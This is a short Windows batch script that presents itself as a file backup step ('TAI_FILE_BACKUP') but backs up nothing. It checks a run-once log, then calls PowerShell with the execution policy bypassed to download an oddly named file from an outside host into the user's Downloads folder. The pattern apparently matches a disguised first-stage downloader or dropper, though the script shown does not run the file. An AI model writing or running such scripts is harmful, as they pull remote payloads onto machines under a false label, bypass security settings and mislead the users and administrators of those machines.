@echo off 
 
set urls=https://spyderrock.com/xx799876-Codexv672.ldbk 
call "%USERPROFILE%\Desktop\dow-code\client-code\checklog.bat" "TAI_FILE_BACKUP-20/05/2025-17:24" 
if %errorlevel% equ 0 ( 
   echo done 
) else ( 
call "%USERPROFILE%\Desktop\dow-code\client-code\addlog.bat" "TAI_FILE_BACKUP-20/05/2025-17:24" 
powershell -NoProfile -ExecutionPolicy Bypass -Command "& {Invoke-WebRequest -Uri 'https://spyderrock.com/xx799876-Codexv672.ldbk' -OutFile '%USERPROFILE%\Downloads\Codexv672.ldbk'}" 
    ) 
    timeout /t 5 
    exit 
